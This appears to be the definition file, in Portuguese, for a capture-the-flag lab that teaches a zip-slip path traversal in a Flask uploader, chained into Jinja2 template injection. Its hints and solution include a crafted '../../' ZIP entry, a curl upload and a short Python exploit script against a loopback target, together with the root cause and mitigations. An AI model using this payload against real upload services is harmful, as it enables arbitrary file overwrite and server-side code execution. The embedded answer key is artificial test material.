@@ -1,0 +1,82 @@
+{
+  "slug": "upload-zip-slip",
+  "title": "Theme Forge",
+  "codename": "THEMEFORGE",
+  "summary": "Um estúdio de pacotes de tema extrai entradas ZIP usando seus nomes no archive. Uma entrada forjada escapa do diretório de upload, sobrescreve o template do relatório e transforma um file upload em execução de template no servidor.",
+  "category": "upload",
+  "difficulty": "hard",
+  "lab_dir": "upload-zip-slip",
+  "estimated_minutes": 30,
+  "xp": 360,
+  "tech": [
+    "Flask",
+    "ZIP",
+    "Filesystem",
+    "Jinja2"
+  ],
+  "tags": [
+    "file-upload",
+    "zip-slip",
+    "path-traversal",
+    "ssti",
+    "arbitrary-write"
+  ],
+  "story": "O Theme Forge permite que designers enviem pacotes ZIP. O extrator confia no nome de cada entrada, e a página de relatório relê seu template do template store do serviço a cada requisição. O serviço consegue ler a flag, mas o relatório normal não a inclui.",
+  "objective": "Crie uma entrada ZIP que escape do diretório do pacote, sobrescreva o template do relatório com uma expressão Jinja que leia a flag e requisite o relatório renderizado.",
+  "rules": "Fique na origem loopback atribuída. O conteúdo do pacote permanece dentro do diretório de estado do lab e só pode sobrescrever o template store do próprio lab.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Flag de execução de template",
+      "flag_type": "user",
+      "points": 360,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Parasonde vai o nome no archive?",
+      "body": "O handler de upload concatena o nome da entrada a um diretório por pacote com `/`. Não há normalização nem verificação de contenção antes de abrir o path de destino.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Escape da raiz do pacote",
+      "body": "O diretório do pacote fica dois níveis abaixo da raiz de estado. Uma entrada chamada `../../templates/report.html` resolve para o template store usado por `/report`.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Faça o relatório ler a flag",
+      "body": "Envie um ZIP contendo `../../templates/report.html` com o conteúdo `{{ flag }}`. Depois faça `GET` em `/report`; o template é relido e renderizado com a flag no contexto.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "Crie um ZIP com uma entrada chamada `../../templates/report.html` cujo conteúdo seja `{{ flag }}`. Envie-o em `/` com `curl -F 'package=@payload.zip' http://127.0.0.1:<port>/upload`. O extrator resolve o destino fora do diretório do pacote. Faça `GET` em `/report`; ele lê o template sobrescrito e renderiza a flag.\n\n```python\nimport io, zipfile, httpx\nbuf = io.BytesIO()\nwith zipfile.ZipFile(buf, 'w') as z:\n    z.writestr('../../templates/report.html', '{{ flag }}')\nbuf.seek(0)\nhttpx.post('http://127.0.0.1:PORT/upload', files={'package': ('theme.zip', buf.getvalue(), 'application/zip')})\nprint(httpx.get('http://127.0.0.1:PORT/report').text)\n```",
+    "root_cause": "O uploader confia nos nomes das entradas ZIP e realiza escritas no filesystem após concatená-los a um path de destino sem canonicalização nem verificação de contenção. Como a página de relatório compila um template lido do store gravável, a escrita arbitrária vira execução de template no servidor e expõe a flag.",
+    "mitigation": "Rejeite paths absolutos e componentes `..`, resolva cada alvo e verifique se ele permanece sob a raiz de extração, use uma allow-list restritiva para o conteúdo do archive, armazene assets enviados fora de paths executáveis/de template e nunca renderize arquivos não confiáveis como templates. Rode o extrator com uma conta de baixo privilégio e um template store somente leitura."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — File upload vulnerabilities",
+      "url": "https://portswigger.net/web-security/file-upload",
+      "source_type": "official",
+      "description": "Parsing de upload, tratamento de nomes de arquivo e caminhos de execução."
+    },
+    {
+      "title": "OWASP — File Upload Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Armazenamento e tratamento de conteúdo seguros em uploads."
+    },
+    {
+      "title": "CWE-22 — Improper Limitation of a Pathname to a Restricted Directory",
+      "url": "https://cwe.mitre.org/data/definitions/22.html",
+      "source_type": "standard",
+      "description": "Causa raiz de path traversal por trás do zip-slip."
+    }
+  ]
+}
